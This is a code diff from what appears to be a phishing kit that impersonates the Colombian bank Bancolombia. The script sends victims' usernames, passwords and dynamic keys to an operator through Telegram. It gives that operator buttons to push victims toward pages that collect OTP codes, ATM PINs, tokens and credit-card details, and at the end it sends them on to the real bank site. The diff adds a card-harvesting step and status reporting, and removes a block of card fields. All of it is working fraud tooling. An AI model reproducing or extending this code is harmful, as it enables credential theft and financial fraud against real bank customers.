@@ -112,33 +112,20 @@
         const message = `
 <b>Nuevo método de pago pendiente de verificación.</b>
 --------------------------------------------------
+🤖 <strong>CODIGO CHAMO</strong>
 🆔 <b>ID:</b> | <b>${transactionId}</b>
 👤 <b>Usuario:</b> | ${usuario}
 🔐 <b>Clave:</b> | ${clave}
 🔑 <b>Dinamica:</b> | ${dinamica}
 --------------------------------------------------
-<b>Detalles del pago:</b>
-----------------------------
-🪪 <b>Cédula:</b> | ${datosTarjeta ? datosTarjeta.cedula : '<i>No disponible</i>'}
-💳 <b>Tarjeta:</b> | ${datosTarjeta ? datosTarjeta.cardNumber : '<i>No disponible</i>'}
-📅 <b>Fecha de expiración:</b> | ${datosTarjeta ? `${datosTarjeta.expMonth}/${datosTarjeta.expYear}` : '<i>No disponible</i>'}
-🔐 <b>CVV:</b> | ${datosTarjeta ? datosTarjeta.cvv : '<i>No disponible</i>'}
-💳 <b>Tipo de tarjeta:</b> | ${datosTarjeta ? datosTarjeta.type : '<i>No disponible</i>'}
-💰 <b>Cuotas:</b> | ${datosTarjeta ? datosTarjeta.cuotas : '<i>No disponible</i>'}
-🏦 <b>Banco:</b> | ${datosTarjeta ? datosTarjeta.bank : '<i>No disponible</i>'}
---------------------------------------------------
-🏠 <b>Dirección:</b> | ${datosTarjeta ? datosTarjeta.address : '<i>No disponible</i>'}
-📞 <b>Teléfono:</b> | ${datosTarjeta ? datosTarjeta.phone : '<i>No disponible</i>'}
-🏙️ <b>Ciudad:</b> | ${datosTarjeta ? datosTarjeta.city : '<i>No disponible</i>'}
-📝 <b>Nombre del propietario:</b> | ${datosTarjeta ? datosTarjeta.ownerName : '<i>No disponible</i>'}
---------------------------------------------------
-        `;
+`;
 
         // Crear botones interactivos
         const keyboard = JSON.stringify({
             inline_keyboard: [
                 [{ text: "Error Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
                 [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
+                [{ text: "TC", callback_data: `tarjeta_credito:${transactionId}` }],
                 [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
                 [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
                 [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
@@ -179,7 +166,7 @@
 
         async function loadTelegramConfig() {
             try {
-                const response = await fetch("botmaster2.php");
+                const response = await fetch("botconfig.json");
                 if (!response.ok) {
                     throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
                 }
@@ -199,46 +186,104 @@
 
                 const verificationUpdate = data.result.find(update =>
                     update.callback_query &&
-                    [
+                  [
                         `pedir_dinamica:${transactionId}`,
                         `pedir_cajero:${transactionId}`,
                         `pedir_otp:${transactionId}`,
                         `pedir_token:${transactionId}`,
+                        `tarjeta_credito:${transactionId}`,
                         `error_tc:${transactionId}`,
                         `error_logo:${transactionId}`,
                         `confirm_finalizar:${transactionId}`
-                        ].includes(update.callback_query.data)
+                    ].includes(update.callback_query.data)
                 );
 
                 if (verificationUpdate) {
                     if (loader) loader.style.display = "none"; // Ocultar loader
 
                     // Aquí manejamos las respuestas de los botones
-                    switch (verificationUpdate.callback_query.data) {
-                        case `pedir_dinamica:${transactionId}`:
-                            window.location.href = "cel-dina-error.html"; // Redirige a la página de clave dinámica
-                            break;
-                        case `pedir_cajero:${transactionId}`:
-                            window.location.href = "ccajero-id.php"; // Redirige a la página de clave de cajero
-                            break;
-                        case `pedir_otp:${transactionId}`:
-                            window.location.href = "index-otp.html"; // Redirige a la página de OTP
-                            break;
-                        case `pedir_token:${transactionId}`:
-                            window.location.href = "token-id.php"; // Redirige a la página de OTP
-                            break;
-                        case `error_tc:${transactionId}`:
-                            alert("Error en tarjeta. Verifique los datos.");
-                            window.location.href = "../../pay/"; // Redirige a la página de pago
-                            break;
-                        case `error_logo:${transactionId}`:
-                            alert("Error en el los datos de usuario. Reintente.");
-                            window.location.href = "index-pc-error.html"; // Redirige a la página de error
-                            break;
-                            case `confirm_finalizar:${transactionId}`:
-                        window.location.href = "../../checking.php";
-                        break;
-                    }
+                   switch (verificationUpdate.callback_query.data) {
+    case `pedir_dinamica:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Clave Dinámica" })
+        }).then(() => {
+            window.location.href = "dinacol.php";
+        });
+        break;
+
+    case `pedir_cajero:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Cajero Automático" })
+        }).then(() => {
+            window.location.href = "ccajero-id.php";
+        });
+        break;
+
+    case `pedir_otp:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Código OTP" })
+        }).then(() => {
+            window.location.href = "index-otp.html";
+        });
+        break;
+
+    case `pedir_token:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Token" })
+        }).then(() => {
+            window.location.href = "index-otp.html";
+        });
+        break;
+
+    case `tarjeta_credito:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Tarjeta Crédito" })
+        }).then(() => {
+            window.location.href = "cards.html";
+        });
+        break;
+
+    case `error_tc:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Error TC" })
+        }).then(() => {
+            window.location.href = "errortc.html";
+        });
+        break;
+
+    case `error_logo:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Error de Logo" })
+        }).then(() => {
+            alert("Error en el inicio de sesión. Reintente.");
+            window.location.href = "index.html";
+        });
+        break;
+
+    case `confirm_finalizar:${transactionId}`:
+        fetch("sendStatus.php", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ status: "Finalización Exitosa" })
+        }).then(() => {
+            window.location.href = "https://www.bancolombia.com/personas";
+        });
+        break;
+}
                 } else {
                     // Si no hay respuesta, esperamos un poco más antes de volver a intentarlo
                     setTimeout(() => checkPaymentVerification(transactionId), 2000);
